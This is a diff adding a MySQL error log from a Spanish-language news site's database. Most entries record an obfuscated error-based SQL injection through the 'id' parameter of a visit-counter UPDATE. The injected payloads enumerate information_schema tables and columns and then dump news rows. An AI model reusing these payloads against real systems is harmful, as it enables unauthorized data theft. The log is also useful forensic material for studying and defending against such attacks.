@@ -1,0 +1,573 @@
+Time : 21:58:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 21:54:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 21:54:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 18:23:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 16:06:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!3254!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 4,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!nacional!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(clasificacion,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2015-11-25 14:07:48!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(date,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!3253!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!economia!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(clasificacion,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 2,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2015-11-25 13:46:22!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(date,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 2,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!3252!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 2,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!mundo!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(clasificacion,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2015-11-25 13:39:28!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(date,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!3251!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:20
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!deportes!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(clasificacion,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:18
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2015-11-25 13:35:23!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(date,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:16
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!3250!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM chihuahuahoy.noticias /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:06:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!1643!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(0),0x217e21) /**/fRoM chihuahuahoy.noticias)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:50
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen6!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 20,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:48
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!fechaorden!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 19,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:46
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!videotype!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 18,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:44
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!visitas!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 17,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!video!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 16,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo5!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 15,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen5!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 14,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo4!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 13,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen4!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 12,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo3!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 11,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen3!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 10,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo2!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 9,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen2!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 8,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 7,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 6,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!titulo!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 5,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:19
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ubicacion!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 4,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:16
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ciudad!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!clasificacion!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 2,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:12
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!date!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!id!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:08
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!21!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(0),0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 and /**/tAbLe_nAmE=0x6e6f746963696173)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:05:00
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!opinion!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/tAbLeS /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:04:58
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!noticias!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/tAbLeS /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79 /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:04:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(0),0x217e21) /**/fRoM information_schema./**/tAbLeS /**/wHeRe /**/tAbLe_sChEmA=0x636869687561687561686f79)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:04:52
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahuahoy!~!1' for key 'group_key'
